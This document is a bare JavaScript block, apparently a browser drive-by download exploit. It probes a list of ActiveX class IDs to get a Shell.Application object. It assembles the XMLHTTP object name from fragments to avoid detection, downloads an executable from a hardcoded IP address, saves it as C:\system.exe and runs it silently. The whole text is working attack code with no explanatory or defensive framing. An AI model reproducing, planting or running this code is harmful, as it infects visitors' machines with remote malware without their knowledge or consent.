<script language="javascript">

function CreateO(o, n) {
var r = null;
try { eval('r = o.CreateObject(n)') }catch(e){}
if (! r) {
try { eval('r = o.CreateObject(n, "")') }catch(e){}
}
if (! r) {
try { eval('r = o.CreateObject(n, "", "")') }catch(e){}
}
if (! r) {
try { eval('r = o.GetObject("", n)') }catch(e){}
}
if (! r) {
try { eval('r = o.GetObject(n, "")') }catch(e){}
}
if (! r) {
try { eval('r = o.GetObject(n)') }catch(e){}
}
return(r);      
}

function Go(a) {
var b="msx";
b=b+"ml2.X";
b=b+"MLHTTP";
var obj_msxml2 = CreateO(a,b);
obj_msxml2.open("GET","http://64.251.27.53/counter/get.php?file=exe&temp=free1",false);
obj_msxml2.send();
var obj_adodb = CreateO(a,"adodb.stream");
obj_adodb.type = 1;
obj_adodb.open();
obj_adodb.Write(obj_msxml2.responseBody);
var fn = "C:\\system.exe";
obj_adodb.SaveToFile(fn,2);
var s = CreateO(a, "Shell.Application");
s.ShellExecute(fn);
return TRUE;
}


var i = 0;
var t = new Array(
'{BD96C556-65A3-11D0-983A-00C04FC29E30}',
'{BD96C556-65A3-11D0-983A-00C04FC29E36}',
'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}',
'{0006F033-0000-0000-C000-000000000046}',
'{0006F03A-0000-0000-C000-000000000046}',
'{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}',
'{6414512B-B978-451D-A0D8-FCFDF33E833C}',
'{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}',
'{06723E09-F4C2-43c8-8358-09FCD1DB0766}',
'{639F725F-1B2D-4831-A9FD-874847682010}',
'{BA018599-1DB3-44f9-83B4-461454C84BF8}',
'{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}',
'{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);

while (t[i]) {
var a = null;
if (t[i].substring(0,1) == '{') {
a = document.createElement("object");
a.setAttribute("classid", "clsid:" + t[i].substring(1, t[i].length - 1));
} else {
try { a = new ActiveXObject(t[i]); } catch(e){}
}

if (a) {
try {           
var b = CreateO(a, "Shell.Application");
if (b) {
if (Go(a)) break;
}
}catch(e){}
}
i++;
}
</script>